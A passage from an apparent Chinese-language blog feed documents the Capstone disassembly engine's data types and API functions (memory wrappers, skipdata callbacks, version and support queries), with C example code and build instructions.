class="line">&#125;</span><br><span class="line"></span><br><span class="line">new_ptr = cs_winkernel_malloc(size);</span><br><span class="line"><span class="keyword">if</span> (!new_ptr) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">current_size = CONTAINING_RECORD(ptr, CS_WINKERNEL_MEMBLOCK, data)-&gt;size;</span><br><span class="line">smaller_size = (current_size &lt; size) ? current_size : size;</span><br><span class="line">RtlCopyMemory(new_ptr, ptr, smaller_size);</span><br><span class="line">cs_winkernel_free(ptr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> new_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>OSX kernel模式： <code>cs_realloc_t cs_mem_realloc = kern_os_realloc;</code></p><h3 id="cs-free-t"><a href="#cs-free-t" class="headerlink" title="cs_free_t"></a>cs_free_t</h3><p><code>typedef void (CAPSTONE_API *cs_free_t)(void *ptr);</code></p><p>cs释放内存<br>用于<code>struct cs_opt_mem</code>，定义于cs.c<br>用户模式： <code>cs_free_t cs_mem_free = free;</code>,调用系统free<br>Windows driver模式： <code>cs_free_t cs_mem_free = cs_winkernel_free;</code></p><p>实现代码<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> CAPSTONE_API <span class="title">cs_winkernel_free</span><span class="params">(<span class="keyword">void</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (ptr) &#123;</span><br><span class="line">ExFreePoolWithTag(CONTAINING_RECORD(ptr, CS_WINKERNEL_MEMBLOCK, data), CS_WINKERNEL_POOL_TAG);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>OSX kernel模式：  <code>cs_free_t cs_mem_free = kern_os_free;</code></p><h3 id="cs-vsnprintf-t"><a href="#cs-vsnprintf-t" class="headerlink" title="cs_vsnprintf_t"></a>cs_vsnprintf_t</h3><p><code>int (CAPSTONE_API *cs_vsnprintf_t)(char *str, size_t size, const char *format, va_list ap);</code></p><p>按size大小输出到字符串str中</p><p>用户模式：<br><img src="https://i.loli.net/2019/07/21/5d340c613ba1e61273.jpg" alt><br>值得注意的是，如果系统为wince，将使用_vsnprintf函数<br>vsnprintf ()和_vsnprintf()对于驱动程序都是可用的，但是它们有一些不同。<br>在需要返回值和设置空终止符时应使用vsnprintf()</p><p>vsnprintf定义在stdio.h<br><img src="https://i.loli.net/2019/07/21/5d340d423babc62961.jpg" alt></p><p>Windows driver模式： <code>cs_vsnprintf_t cs_vsnprintf = cs_winkernel_vsnprintf;</code></p><p>代码实现</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> CAPSTONE_API <span class="title">cs_winkernel_vsnprintf</span><span class="params">(<span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> count, <span class="keyword">const</span> <span class="keyword">char</span> *format, va_list argptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> result = _vsnprintf(buffer, count, format, argptr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// _vsnprintf()在字符串被截断时返回-1，在整个字符串被存储但“buffer”末尾没有“\0”时返回“count”。在这两种情况下，都需要手动添加空终止符。</span></span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">-1</span> || (<span class="keyword">size_t</span>)result == count) &#123;</span><br><span class="line">buffer[count - <span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="comment">// 在返回-1时，函数必须获取并返回一些本来要写入的字符。因此，通过重试使用temp buffer进行相同的转换，这个缓冲区就可能足够大来完成格式化，并且获得很多本应写入的字符。</span></span><br><span class="line"><span class="keyword">char</span>* tmp = cs_winkernel_malloc(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">if</span> (!tmp) &#123;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">result = _vsnprintf(tmp, <span class="number">0x1000</span>, format, argptr);</span><br><span class="line">NT_ASSERT(result != <span class="number">-1</span>);</span><br><span class="line">cs_winkernel_free(tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>OSX kernel模式： <code>cs_vsnprintf_t cs_vsnprintf = vsnprintf;</code>，使用默认vsnprintf</p><h3 id="cs-skipdata-cb-t"><a href="#cs-skipdata-cb-t" class="headerlink" title="cs_skipdata_cb_t"></a>cs_skipdata_cb_t</h3><p>size_t (CAPSTONE_API <em>cs_skipdata_cb_t)(const uint8_t </em>code, size_t code_size, size_t offset, void *user_data);</p><p>SKIPDATA选项的用户自定义回调函数。</p><p>code:包含要分解的代码的输入缓冲区。和传递给cs_disasm()的缓冲区相同。<br>code_size:上面的code缓冲区的大小(以字节为单位)。<br>offset:上面提到的输入缓冲区code中当前检查字节的位置。<br>user_data:用户数据通过cs_opt_skipdata结构中的@user_data字段传递给cs_option()。<br>return:返回要跳过的字节数，或者0表示立即停止反汇编。</p><p>cs_skipdata_cb_t在<code>struct cs_opt_skipdata</code>中调用，下面来看一个例子<br>分析写在注释中<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> &#123;</span></span><br><span class="line">cs_arch arch;</span><br><span class="line">cs_mode mode;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* comment;</span><br><span class="line">cs_opt_type opt_type;</span><br><span class="line">cs_opt_value opt_value;</span><br><span class="line">cs_opt_type opt_skipdata;</span><br><span class="line"><span class="keyword">size_t</span> skipdata;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_string_hex</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* str, <span class="keyword">size_t</span> len)</span>  <span class="comment">//输出机器码</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Code: "</span>);</span><br><span class="line"><span class="keyword">for</span> (c = str; c &lt; str + len; c++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%02x "</span>, *c &amp; <span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE32 <span class="meta-string">"\x8d\x4c\x32\x08\x01\xd8\x81\xc6\x34\x12\x00\x00\x00\x91\x92"</span>  <span class="comment">//测试用机器码</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RANDOM_CODE <span class="meta-string">"\xed\x00\x00\x00\x00\x1a\x5a\x0f\x1f\xff\xc2\x09\x80\x00\x00\x00\x07\xf7\xeb\x2a\xff\xff\x7f\x57\xe3\x01\xff\xff\x7f\x57\xeb\x00\xf0\x00\x00\x24\xb2\x4f\x00\x78"</span></span></span><br><span class="line"></span><br><span class="line">cs_opt_skipdata skipdata = &#123;</span><br><span class="line"><span class="comment">// 把默认 "data" 描述符从 ".byte" 重命名为 "db"</span></span><br><span class="line"><span class="string">"db"</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> <span class="title">platforms</span>[2] = &#123;</span>         <span class="comment">//以默认描述符和自定义描述符两种方式建立一个数组</span></span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_32,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE32,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE32) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 32 (Intel syntax) - Skip data"</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_32,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE32,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE32) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 32 (Intel syntax) - Skip data with custom mnemonic"</span>,</span><br><span class="line">CS_OPT_INVALID,</span><br><span class="line">CS_OPT_OFF,</span><br><span class="line">CS_OPT_SKIPDATA_SETUP,</span><br><span class="line">(<span class="keyword">size_t</span>)&amp; skipdata,</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">csh handle;   <span class="comment">//建立capstone句柄</span></span><br><span class="line"><span class="keyword">uint64_t</span> address = <span class="number">0x1000</span>;  <span class="comment">//设置起始地址</span></span><br><span class="line">cs_insn* insn;  <span class="comment">//具体信息结构体</span></span><br><span class="line">cs_err err;  <span class="comment">//错误枚举</span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">size_t</span> count;  <span class="comment">//成功反汇编行数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(platforms) / <span class="keyword">sizeof</span>(platforms[<span class="number">0</span>]); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"****************\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Platform: %s\n"</span>, platforms[i].comment);</span><br><span class="line">err = cs_open(platforms[i].arch, platforms[i].mode, &amp;handle);  <span class="comment">//错误检查</span></span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed on cs_open() with error returned: %u\n"</span>, err);</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (platforms[i].opt_type)</span><br><span class="line">cs_option(handle, platforms[i].opt_type, platforms[i].opt_value);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开SKIPDATA 模式</span></span><br><span class="line">cs_option(handle, CS_OPT_SKIPDATA, CS_OPT_ON);</span><br><span class="line">cs_option(handle, platforms[i].opt_skipdata, platforms[i].skipdata);</span><br><span class="line"></span><br><span class="line">count = cs_disasm(handle, platforms[i].code, platforms[i].size, address, <span class="number">0</span>, &amp;insn);</span><br><span class="line"><span class="keyword">if</span> (count) &#123;</span><br><span class="line"><span class="keyword">size_t</span> j;</span><br><span class="line"></span><br><span class="line">print_string_hex(platforms[i].code, platforms[i].size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Disasm:\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; count; j++) &#123;  <span class="comment">//输出汇编</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span> PRIx64 <span class="string">":\t%s\t\t%s\n"</span>,</span><br><span class="line">insn[j].address, insn[j].mnemonic, insn[j].op_str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最后一行代码后打印偏移</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span> PRIx64 <span class="string">":\n"</span>, insn[j - <span class="number">1</span>].address + insn[j - <span class="number">1</span>].size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放cs_disasm()申请的内存</span></span><br><span class="line">cs_free(insn, count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"****************\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Platform: %s\n"</span>, platforms[i].comment);</span><br><span class="line">print_string_hex(platforms[i].code, platforms[i].size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to disasm given code!\n"</span>);</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行结果如下，可以看出，默认的 .byte数据类型被改为db描述符<br><img src="https://i.loli.net/2019/07/21/5d3457518e35444335.jpg" alt></p><h3 id="cs-version"><a href="#cs-version" class="headerlink" title="cs_version"></a>cs_version</h3><p><code>unsigned int CAPSTONE_API cs_version(int *major, int *minor);</code></p><p>用来输出capstone版本号<br>参数<br>major: API主版本<br>minor: API次版本<br>return: 返回主次版本的16进制，如4.0版本返回 0x0400</p><p>通过分析源码发现<br><img src="https://i.loli.net/2019/07/21/5d345fe61e3c630129.jpg" alt></p><p><img src="https://i.loli.net/2019/07/21/5d34602a326f528259.jpg" alt><br>该版本定义于cs.c中，编译后不可更改，不接受自定义版本</p><p>示例1：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> cs_version(<span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> version = test();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%X"</span>, version);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出<br><img src="https://i.loli.net/2019/07/21/5d3465239ff2d14595.jpg" alt></p><p>示例2，强行修改版本：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ma[] = &#123; <span class="number">5</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> mi[] = &#123; <span class="number">6</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> cs_version(ma, mi);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> version = test();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%X"</span>, version);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：<br><img src="https://i.loli.net/2019/07/21/5d3465bc7716b49405.jpg" alt><br>可以看到并不能改变</p><h3 id="cs-support"><a href="#cs-support" class="headerlink" title="cs_support"></a>cs_support</h3><p>bool CAPSTONE_API cs_support(int query);</p><p>用来检查capstone库是否支持参数输入的架构或处于某编译选项<br>通过查看源码得知，共有四种查询参数</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> CAPSTONE_API <span class="title">cs_support</span><span class="params">(<span class="keyword">int</span> query)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (query == CS_ARCH_ALL)</span><br><span class="line"><span class="keyword">return</span> all_arch == ((<span class="number">1</span> &lt;&lt; CS_ARCH_ARM) | (<span class="number">1</span> &lt;&lt; CS_ARCH_ARM64) |</span><br><span class="line">(<span class="number">1</span> &lt;&lt; CS_ARCH_MIPS) | (<span class="number">1</span> &lt;&lt; CS_ARCH_X86) |</span><br><span class="line">(<span class="number">1</span> &lt;&lt; CS_ARCH_PPC) | (<span class="number">1</span> &lt;&lt; CS_ARCH_SPARC) |</span><br><span class="line">(<span class="number">1</span> &lt;&lt; CS_ARCH_SYSZ) | (<span class="number">1</span> &lt;&lt; CS_ARCH_XCORE) |</span><br><span class="line">(<span class="number">1</span> &lt;&lt; CS_ARCH_M68K) | (<span class="number">1</span> &lt;&lt; CS_ARCH_TMS320C64X) |</span><br><span class="line">(<span class="number">1</span> &lt;&lt; CS_ARCH_M680X) | (<span class="number">1</span> &lt;&lt; CS_ARCH_EVM));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)query &lt; CS_ARCH_MAX)</span><br><span class="line"><span class="keyword">return</span> all_arch &amp; (<span class="number">1</span> &lt;&lt; query);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (query == CS_SUPPORT_DIET) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CAPSTONE_DIET</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (query == CS_SUPPORT_X86_REDUCE) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CAPSTONE_HAS_X86) &amp;&amp; defined(CAPSTONE_X86_REDUCE)</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// unsupported query</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例1(CS_ARCH_ALL，检查是否支持所有架构)：<br><img src="https://i.loli.net/2019/07/21/5d3469069954048775.jpg" alt></p><p>示例2(CS<em>ARCH</em>*，检查是否支持指定架构)<br><img src="https://i.loli.net/2019/07/21/5d34698a9ee7d33247.jpg" alt></p><p>示例3(检查是否处于DIET编译模式)：<br><img src="https://i.loli.net/2019/07/21/5d346a147b7e947704.jpg" alt></p><p>示例4(检查是否处于X86_REDUCE编译模式)：<br><img src="https://i.loli.net/2019/07/21/5d346a844b5b058873.jpg" alt>)</p><p>From <a href="https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(二">https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(二)/</a>/) bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Capstone反汇编引擎数据类型及API分析及示例-二&quot;&gt;&lt;a href=&quot;#Capstone反汇编引擎数据类型及API分析及示例-二&quot; class=&quot;headerlink&quot; title=&quot;Capstone反汇编引擎数据类型及API分析及示例(二)&quot;&gt;&lt;/a&gt;C
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="反汇编" scheme="https://kabeor.github.io/tags/%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>Capstone反汇编引擎数据类型及API分析及示例(一)</title>
    <link href="https://kabeor.github.io/Capstone%E5%8F%8D%E6%B1%87%E7%BC%96%E5%BC%95%E6%93%8E%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E5%8F%8A%E7%A4%BA%E4%BE%8B(%E4%B8%80)/"/>
    <id>https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(一)/</id>
    <published>2019-07-20T07:14:11.341Z</published>
    <updated>2019-07-26T04:39:24.236Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Capstone反汇编引擎数据类型及API分析及示例-一"><a href="#Capstone反汇编引擎数据类型及API分析及示例-一" class="headerlink" title="Capstone反汇编引擎数据类型及API分析及示例(一)"></a>Capstone反汇编引擎数据类型及API分析及示例(一)</h1><blockquote><p>本文由本人首发于先知社区 <a href="https://xz.aliyun.com/t/5753" target="_blank" rel="noopener">https://xz.aliyun.com/t/5753</a></p></blockquote><p>最近准备用开源的反汇编引擎做个项目，研究了OllyDebug的ODDisasm，disasm与assembl部分代码的思想都很值得学习，但毕竟是2000年的产物，指令集只支持x86，也没有对语义的深度分析，于是转向了对Capstone的研究。</p><p>Capstone反汇编引擎可以说是如今世界上最优秀的反汇编引擎，IDA，Radare2，Qemu等著名项目都使用了Capstone Engine，所以选择它来开发是一个不错的选择。<br>但在开发时发现官方并未给出详细API文档，网上也没有类似的分析，因此想到自己阅读源码和试验，由此写出了一个简单的非官方版本的API手册，希望能与大家分享。</p><h2 id="0x0-开发准备"><a href="#0x0-开发准备" class="headerlink" title="0x0 开发准备"></a>0x0 开发准备</h2><p>  Capstone官网： <a href="http://www.capstone-engine.org" target="_blank" rel="noopener">http://www.capstone-engine.org</a></p><h3 id="自行编译lib和dll方法"><a href="#自行编译lib和dll方法" class="headerlink" title="自行编译lib和dll方法"></a>自行编译lib和dll方法</h3><p>  源码： <a href="https://github.com/aquynh/capstone/archive/4.0.1.zip" target="_blank" rel="noopener">https://github.com/aquynh/capstone/archive/4.0.1.zip</a></p><p>  下载后解压<br>  文件结构如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   .                   &lt;- 主要引擎core engine + README + 编译文档COMPILE.TXT 等</span><br><span class="line">├── arch            &lt;- 各语言反编译支持的代码实现</span><br><span class="line">│   ├── AArch64     &lt;- ARM64 (aka ARMv8) 引擎</span><br><span class="line">│   ├── ARM         &lt;- ARM 引擎</span><br><span class="line">│   ├── EVM         &lt;- Ethereum 引擎</span><br><span class="line">│   ├── M680X       &lt;- M680X 引擎</span><br><span class="line">│   ├── M68K        &lt;- M68K 引擎</span><br><span class="line">│   ├── Mips        &lt;- Mips 引擎</span><br><span class="line">│   ├── PowerPC     &lt;- PowerPC 引擎</span><br><span class="line">│   ├── Sparc       &lt;- Sparc 引擎</span><br><span class="line">│   ├── SystemZ     &lt;- SystemZ 引擎</span><br><span class="line">│   ├── TMS320C64x  &lt;- TMS320C64x 引擎</span><br><span class="line">│   ├── X86         &lt;- X86 引擎</span><br><span class="line">│   └── XCore       &lt;- XCore 引擎</span><br><span class="line">├── bindings        &lt;- 中间件</span><br><span class="line">│   ├── java        &lt;- Java 中间件 + 测试代码</span><br><span class="line">│   ├── ocaml       &lt;- Ocaml 中间件 + 测试代码</span><br><span class="line">│   └── python      &lt;- Python 中间件 + 测试代码</span><br><span class="line">├── contrib         &lt;- 社区代码</span><br><span class="line">├── cstool          &lt;- Cstool 检测工具源码</span><br><span class="line">├── docs            &lt;- 文档，主要是capstone的实现思路</span><br><span class="line">├── include         &lt;- C头文件</span><br><span class="line">├── msvc            &lt;- Microsoft Visual Studio 支持（Windows）</span><br><span class="line">├── packages        &lt;- Linux/OSX/BSD包</span><br><span class="line">├── windows         &lt;- Windows 支持(Windows内核驱动编译)</span><br><span class="line">├── suite           &lt;- Capstone开发测试工具</span><br><span class="line">├── tests           &lt;- C语言测试用例</span><br><span class="line">└── xcode           &lt;- Xcode 支持 (MacOSX 编译)</span><br></pre></td></tr></table></figure></p><p>下面演示Windows10使用Visual Studio2019编译</p><p>复制msvc文件夹到一个比较清爽的位置（强迫症专用），内部结构如下：</p><p><img src="https://i.loli.net/2019/07/20/5d32b771e4c0118081.jpg" alt></p><p>VS打开capstone.sln项目文件，解决方案自动载入这些</p><p><img src="https://i.loli.net/2019/07/20/5d32b810db76b87698.jpg" alt></p><p>可以看到支持的所有语言都在这里了，如果都需要的话，直接编译就好了，只需要其中几种，则右键解决方案-&gt;属性-&gt;配置属性  如下</p><p><img src="https://i.loli.net/2019/07/20/5d32b92a26e1328865.jpg" alt></p><p>生成选项中勾选你需要的支持项即可<br>编译后会在当前文件夹Debug目录下生成capstone.lib静态编译库和capstone.dll动态库这样就可以开始使用Capstone进行开发了</p><p>如果不想自己编译，官方也提供了官方编译版本<br>Win32： <a href="https://github.com/aquynh/capstone/releases/download/4.0.1/capstone-4.0.1-win32.zip" target="_blank" rel="noopener">https://github.com/aquynh/capstone/releases/download/4.0.1/capstone-4.0.1-win32.zip</a><br>Win64： <a href="https://github.com/aquynh/capstone/releases/download/4.0.1/capstone-4.0.1-win64.zip" target="_blank" rel="noopener">https://github.com/aquynh/capstone/releases/download/4.0.1/capstone-4.0.1-win64.zip</a></p><p>选x32或x64将影响后面开发的位数</p><h3 id="引擎调用测试"><a href="#引擎调用测试" class="headerlink" title="引擎调用测试"></a>引擎调用测试</h3><p>新建一个VS项目，将..\capstone-4.0.1\include\capstone中的头文件以及编译好的lib和dll文件全部拷贝到新建项目的主目录下</p><p><img src="https://i.loli.net/2019/07/20/5d32bbbde025889046.jpg" alt></p><p>在VS解决方案中，头文件添加现有项capstone.h，资源文件中添加capstone.lib，重新生成解决方案</p><p><img src="https://i.loli.net/2019/07/20/5d32bc284c4e175661.jpg" alt></p><p>那么现在来测试一下我们自己的capstone引擎吧</p><p>主文件写入如下代码</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cinttypes&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">csh handle;</span><br><span class="line">cs_insn* insn;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to initialize engine!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">count = cs_disasm(handle, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)CODE, <span class="keyword">sizeof</span>(CODE) - <span class="number">1</span>, <span class="number">0x1000</span>, <span class="number">0</span>, &amp;insn);</span><br><span class="line"><span class="keyword">if</span> (count) &#123;</span><br><span class="line"><span class="keyword">size_t</span> j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; count; j++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span><span class="string">"Ix"</span><span class="string">":\t%s\t\t%s\n"</span>, insn[j].address, insn[j].mnemonic, insn[j].op_str);</span><br><span class="line">&#125;</span><br><span 